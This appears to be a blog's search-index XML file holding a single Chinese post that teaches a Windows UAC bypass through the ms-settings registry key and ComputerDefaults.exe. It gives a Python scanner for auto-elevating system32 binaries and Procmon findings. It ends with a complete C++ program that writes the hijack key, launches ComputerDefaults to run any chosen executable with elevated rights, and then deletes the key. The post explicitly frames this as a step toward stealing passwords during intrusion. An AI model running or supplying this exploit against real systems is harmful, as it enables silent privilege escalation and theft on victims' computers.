<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>基于白名单注册表bypassUAC</title>
      <link href="/2020/11/25/regeditbypassuac/"/>
      <url>/2020/11/25/regeditbypassuac/</url>
      
        <content type="html"><![CDATA[<h1 id="基于白名单注册表bypassUAC"><a href="#基于白名单注册表bypassUAC" class="headerlink" title="基于白名单注册表bypassUAC"></a>基于白名单注册表bypassUAC</h1><h2 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h2><p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p><p>当前用户是管理员权限，但是有些exe会弹出用户账户控制，如果点击否的话，就会出现拒绝访问，那么也就没有成功运行该程序了。这样就会影响后续的内网渗透，例如取密码等，所以我们需要bypassuac。</p><p><img src="/img/regeditBypassUAC/1.jpg" alt></p><p><img src="/img/regeditBypassUAC/2.jpg" alt></p><p>手动bypassuac，右键以管理员身份运行，但是显然这个是不现实的</p><p><img src="/img/regeditBypassUAC/3.jpg" alt></p><h2 id="0x02-发掘bypassUAC的程序"><a href="#0x02-发掘bypassUAC的程序" class="headerlink" title="0x02 发掘bypassUAC的程序"></a>0x02 发掘bypassUAC的程序</h2><p>有一些系统程序是会直接获取管理员权限同时不弹出UAC弹窗，这类程序被称为白名单程序。 这些程序拥有autoElevate属性的值为True，会在启动时就静默提升权限。</p><pre><code>1. 程序的manifest标识的配置属性 autoElevate为true2. 程序不弹出UAC弹窗3. 从注册表里查询Shell\Open\command键值对</code></pre><h3 id="0x02-1-寻找autoElevate为true的程序"><a href="#0x02-1-寻找autoElevate为true的程序" class="headerlink" title="0x02-1 寻找autoElevate为true的程序"></a>0x02-1 寻找autoElevate为true的程序</h3><p><img src="/img/regeditBypassUAC/4.jpg" alt></p><p>这里写了个py脚本遍历c:\windows\system32\目录下的所有exe文件，寻找autoElevate为true的exe程序</p><pre><code>import osfrom subprocess import *# path = r&#39;C:\Users\bingdu\Desktop\bypassUAC&#39;path = &#39;c:\windows\system32&#39;files = os.listdir(path)print(files)def GetFileList(path, fileList):    newDir = path    if os.path.isfile(path):        if path[-4:] == &#39;.exe&#39;:            fileList.append(path)    elif os.path.isdir(path):        try:            for s in os.listdir(path):                newDir=os.path.join(path,s)                GetFileList(newDir, fileList)        except Exception as e:            pass    return fileListfiles = GetFileList(path, [])      print(files)for eachFile in files:    if eachFile[-4:] == &#39;.exe&#39;:        command = r&#39;.\sigcheck64.exe -m {} | findstr auto&#39;.format(eachFile)        print(command)        p1 = Popen(command, shell=True, stdin=PIPE, stdout=PIPE)        if &#39;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&#39; in p1.stdout.read().decode(&#39;gb2312&#39;):            copy_command = r&#39;copy {} .\success&#39;.format(eachFile)            Popen(copy_command, shell=True, stdin=PIPE, stdout=PIPE)            print(&#39;[+] {}&#39;.format(eachFile))            with open(&#39;success.txt&#39;, &#39;at&#39;) as f:                f.writelines(&#39;{}\n&#39;.format(eachFile))</code></pre><p><img src="/img/regeditBypassUAC/5.jpg" alt></p><p>结果如下：</p><pre><code>c:\windows\system32\bthudtask.exec:\windows\system32\changepk.exec:\windows\system32\ComputerDefaults.exec:\windows\system32\dccw.exec:\windows\system32\dcomcnfg.exec:\windows\system32\DeviceEject.exec:\windows\system32\DeviceProperties.exec:\windows\system32\djoin.exec:\windows\system32\easinvoker.exec:\windows\system32\EASPolicyManagerBrokerHost.exec:\windows\system32\eudcedit.exec:\windows\system32\eventvwr.exec:\windows\system32\fodhelper.exec:\windows\system32\fsquirt.exec:\windows\system32\FXSUNATD.exec:\windows\system32\immersivetpmvscmgrsvr.exec:\windows\system32\iscsicli.exec:\windows\system32\iscsicpl.exec:\windows\system32\lpksetup.exec:\windows\system32\MSchedExe.exec:\windows\system32\msconfig.exec:\windows\system32\msra.exec:\windows\system32\MultiDigiMon.exec:\windows\system32\newdev.exec:\windows\system32\odbcad32.exec:\windows\system32\PasswordOnWakeSettingFlyout.exec:\windows\system32\pwcreator.exec:\windows\system32\rdpshell.exec:\windows\system32\recdisc.exec:\windows\system32\rrinstaller.exec:\windows\system32\shrpubw.exec:\windows\system32\slui.exec:\windows\system32\Sysprep\sysprep.exec:\windows\system32\SystemPropertiesAdvanced.exec:\windows\system32\SystemPropertiesComputerName.exec:\windows\system32\SystemPropertiesDataExecutionPrevention.exec:\windows\system32\SystemPropertiesHardware.exec:\windows\system32\SystemPropertiesPerformance.exec:\windows\system32\SystemPropertiesProtection.exec:\windows\system32\SystemPropertiesRemote.exec:\windows\system32\SystemSettingsAdminFlows.exec:\windows\system32\SystemSettingsRemoveDevice.exec:\windows\system32\Taskmgr.exec:\windows\system32\tcmsetup.exec:\windows\system32\TpmInit.exec:\windows\system32\WindowsUpdateElevatedInstaller.exec:\windows\system32\WSReset.exec:\windows\system32\wusa.exe</code></pre><h3 id="0x02-2-寻找不弹UAC框的程序"><a href="#0x02-2-寻找不弹UAC框的程序" class="headerlink" title="0x02-2 寻找不弹UAC框的程序"></a>0x02-2 寻找不弹UAC框的程序</h3><p>在cmd一个个的去运行exe，如果不弹uac框就运行的既是</p><p>结果如下，下面只是找的前面几个，后面的没有去测试</p><pre><code>c:\windows\system32\bthudtask.exe                       okc:\windows\system32\changepk.exec:\windows\system32\ComputerDefaults.exe                ok      1c:\windows\system32\dccw.exe                            ok      1c:\windows\system32\dcomcnfg.exe                        ok      1c:\windows\system32\DeviceEject.exe                     ok  c:\windows\system32\DeviceProperties.exe                okc:\windows\system32\djoin.exe                           okc:\windows\system32\easinvoker.exe                      okc:\windows\system32\EASPolicyManagerBrokerHost.exe      okc:\windows\system32\eudcedit.exe                        ok      1c:\windows\system32\eventvwr.exe                        ok      1c:\windows\system32\fodhelper.exe                       ok      1c:\windows\system32\fsquirt.exe                         ok      1c:\windows\system32\FXSUNATD.exe                        okc:\windows\system32\immersivetpmvscmgrsvr.exe           okc:\windows\system32\iscsicli.exe                        ok      1c:\windows\system32\iscsicpl.exe                        ok      1</code></pre><h3 id="0x02-3-从注册表里查询Shell-Open-command键值对"><a href="#0x02-3-从注册表里查询Shell-Open-command键值对" class="headerlink" title="0x02-3 从注册表里查询Shell\Open\command键值对"></a>0x02-3 从注册表里查询Shell\Open\command键值对</h3><p>通常以shell\open\command命名的键值对存储的是可执行文件的路径，如果exe程序运行的时候找到该键值对，就会运行该键值对的程序，而因为exe运行的时候是静默提升了权限，所以运行的该键值对的程序就已经过了uac。</p><p>所以我们把恶意的exe路径写入该键值对，那么就能够过uac执行我们的恶意exe。</p><p>使用Procmon监听，运行0x02-2的结果</p><p>这里以c:\windows\system32\ComputerDefaults.exe测试</p><p>过滤条件如下</p><p><img src="/img/regeditBypassUAC/6.jpg" alt></p><p>会去查询HKCU:\Software\Classes\ms-settings\shell\open\command</p><p><img src="/img/regeditBypassUAC/7.jpg" alt></p><p>然后我们再注册表里创建该键值对</p><p><img src="/img/regeditBypassUAC/8.jpg" alt><br>继续监听，重新运行c:\windows\system32\ComputerDefaults.exe，发现还查询了HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute的键值对</p><p><img src="/img/regeditBypassUAC/9.jpg" alt></p><p>在注册表里创建HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute</p><p><img src="/img/regeditBypassUAC/10.jpg" alt></p><p>继续监听，重新运行c:\windows\system32\ComputerDefaults.exe，这时候采取获取Software\Classes\ms-settings\shell\open\command的默认值，然后就会运行该值的程序</p><p><img src="/img/regeditBypassUAC/11.jpg" alt></p><h3 id="0x02-4-总结"><a href="#0x02-4-总结" class="headerlink" title="0x02-4 总结"></a>0x02-4 总结</h3><p>如果键值对HKCU:\Software\Classes\ms-settings\shell\open\command存在，ComputerDefaults会接下去查找HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute是否也存在,若也存在到则读取HKCU:\Software\Classes\ms-settings\shell\open\command的值然后执行。</p><p>测试：将HKCU:\Software\Classes\ms-settings\shell\open\command(default)的值设置为cmd.exe，然后运行c:\windows\system32\ComputerDefaults.exe</p><p><img src="/img/regeditBypassUAC/12.jpg" alt></p><p>成功弹出exe，并且是过了uac的权限</p><p><img src="/img/regeditBypassUAC/13.jpg" alt></p><h2 id="0x03-C-代码实现运行任意exe过uac"><a href="#0x03-C-代码实现运行任意exe过uac" class="headerlink" title="0x03 C++代码实现运行任意exe过uac"></a>0x03 C++代码实现运行任意exe过uac</h2><pre><code>#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;int wmain(int argc, wchar_t* argv[]) {    if (argc != 2) {        wprintf(L&quot;Usage: %s &lt;filePath&gt;\n&quot;, argv[0]);        wprintf(L&quot;       %s cmd.exe\n&quot;, argv[0]);        exit(1);    }    LPWSTR filePath = argv[1];    PROCESS_INFORMATION pi = { 0 };    STARTUPINFOA si = { 0 };    HKEY hKey;    si.cb = sizeof(STARTUPINFO);    si.wShowWindow = SW_HIDE;    RegCreateKeyW(HKEY_CURRENT_USER, L&quot;Software\\Classes\\ms-settings\\Shell\\open\\command&quot;, &amp;hKey);       // 创建注册表项    RegSetValueExW(hKey, L&quot;&quot;, 0, REG_SZ, (LPBYTE)filePath, lstrlenW(filePath));                             // 赋值，执行的exe路径    RegSetValueExW(hKey, L&quot;DelegateExecute&quot;, 0, REG_SZ, (LPBYTE)&quot;&quot;, sizeof(&quot;&quot;));    // 创建进程ComputerDefaults    CreateProcessA(&quot;C:\\Windows\\System32\\cmd.exe&quot;, (LPSTR)&quot;/c C:\\Windows\\System32\\ComputerDefaults.exe&quot;, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &amp;si, &amp;pi);    // 延时十秒，等ComputerDefaults.exe运行    Sleep(10000);    // 清楚注册表项    RegDeleteTreeA(HKEY_CURRENT_USER, &quot;Software\\Classes\\ms-settings&quot;);    return 0;}</code></pre><p>效果：</p><p><img src="/img/regeditBypassUAC/14.jpg" alt></p><h2 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h2><p><img src="/img/regeditBypassUAC/regeditBypassUAC.gif" alt></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://idiotc4t.com/privilege-escalation/bypassuac-fodhelper" target="_blank" rel="noopener">https://idiotc4t.com/privilege-escalation/bypassuac-fodhelper</a></p>]]></content>
      
      
      <categories>
          
          <category> BypassUAC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BypassUAC </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
